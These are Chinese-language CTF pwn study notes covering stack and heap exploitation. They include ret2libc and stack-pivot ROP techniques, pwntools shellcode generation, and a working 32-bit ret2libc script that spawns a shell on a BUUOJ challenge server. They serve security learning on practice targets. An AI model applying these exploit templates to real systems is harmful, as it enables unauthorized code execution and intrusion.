# Pwn笔记

1. 程序关闭标准输出会导致getshell后无法得到cat flag的输出。这时可以用命令`exec 1>&0`将标准输出重定向到标准输入，再执行cat flag就能看见了。因为默认打开一个终端后，0，1，2（标准输入，标准输出，标准错误）都指向同一个位置也就是当前终端。详情见这篇[文章](https://blog.csdn.net/xirenwang/article/details/104139866)。例题：[wustctf2020_closed](https://buuoj.cn/challenges#wustctf2020_closed)
2. 做菜单类堆题时，添加堆块的函数一般是最重要的，需要通过分析函数来构建出程序对堆块的安排。比如有些笔记管理题会把笔记名称放一个堆中，笔记内容放另一个堆中，再用一个列表记录指针。了解程序是怎么安排堆后才能根据漏洞制定利用计划。如果分析不出来，用gdb调试对着看会好很多。例题：[babyfengshui](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/6%E7%BA%A7/Pwn/babyfengshui.md)
3. 利用A和%p计算格式化字符串偏移。例题：[axb_2019_fmt32](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/pwn/axb_2019_fmt32.md)
4. 堆uaf基本利用。例题：[ciscn_2019_n_3](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/pwn/ciscn_2019_n_3.md)
5. pwntools生成shellcode

适用于linux。不过我到现在还没见过windows的pwn，可能是windows考的不多吧。

```python
#32位
from pwn import*
context(log_level = 'debug', arch = 'i386', os = 'linux')
shellcode=asm(shellcraft.sh())
print(shellcode)

#64位
from pwn import*
context(log_level = 'debug', arch = 'amd64', os = 'linux')
shellcode=asm(shellcraft.sh())
print(shellcode)
```

6. pwn rop题模板

### 64位

ret2libc+格式化字符串绕canary:[bjdctf_2020_babyrop2](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/pwn/bjdctf_2020_babyrop2.md)。

ropchain getshell+溢出绕canary:[rop64](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/moectf/Pwn/rop64.md)。

ret2libc:[ret2libc](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/moectf/Pwn/ret2libc.md)

### 32位

ret2libc:[pwn-200](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/4%E7%BA%A7/Pwn/pwn-200.md)。

```python
from pwn import *
context.log_level='debug'
write_plt=0x08048370
write_got=0x0804a01c
ret_addr=0x0804847b
payload=b'a'*0x8c+p32(write_plt)+p32(ret_addr)+p32(1)+p32(write_got)+p32(4)
p=remote("node4.buuoj.cn",26320)
p.sendline(payload)
write_addr=u32(p.recv(4))
system_offset=239936
write_offset=869312
bin_sh_offset=0x0015902b
libc_base=write_addr-write_offset
payload=b'a'*0x8c+p32(libc_base+system_offset)+p32(ret_addr)+p32(libc_base+bin_sh_offset)
p.sendline(payload)
p.interactive()
```

栈迁移+ret2libc:[[Black Watch 入群题]PWN](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/pwn/%5BBlack%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98%5DPWN.md)

栈迁移:[ciscn_2019_es_2](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/pwn/ciscn_2019_es_2.md)

栈迁移分很多种情况。第一种情况：`偏移+栈迁移目标地址-4+leave_ret`，同时目标地址直接写ropchain。第二种情况：`偏移+栈迁移目标地址+leave_ret`，目标地址先根据程序是多少位的填充4或者8个字节，再写ropchain。第三种情况，迁移的目标地址离一些重要地址比较近，比如got表，这时候就要留出一些位置，`偏移+栈迁移目标地址-0xd0+leave_ret`，目标地址先写0xd0+4个偏移再写ropchain；或者`偏移+栈迁移目标地址+leave_ret`，但是目标地址的ropchain前面加上若干个ret，抬高栈。例题：[gyctf_2020_borrowstack](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/pwn/gyctf_2020_borrowstack.md)

7. pwntools得到libc偏移

承接rop题模板，上面的脚本中xxx_offset就是这么来的。至于为什么要多此一举打印出来，全是因为我没配置好linux环境。配置好的各位直接要`libc.sym['xxx]`那段就行了。

```python
from pwn import *
libc=ELF("libc-2.23.so")
print(f"system:{libc.sym['system']}")
print(f"write:{libc.sym['write']}")
print(f"puts:{libc.sym['puts']}")
print(f"/bin/sh:{libc.search(b'/bin/sh').__next__()}")
```

8. pwn heap题模板

### 64位

unsorted bin attack:[hitcontraining_magicheap](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/pwn/hitcontraining_magicheap.md)

9. 栈溢出[计算偏移量](https://blog.csdn.net/weixin_62675330/article/details/123344386)（gdb，gdb-peda,pwntools cyclic,ida)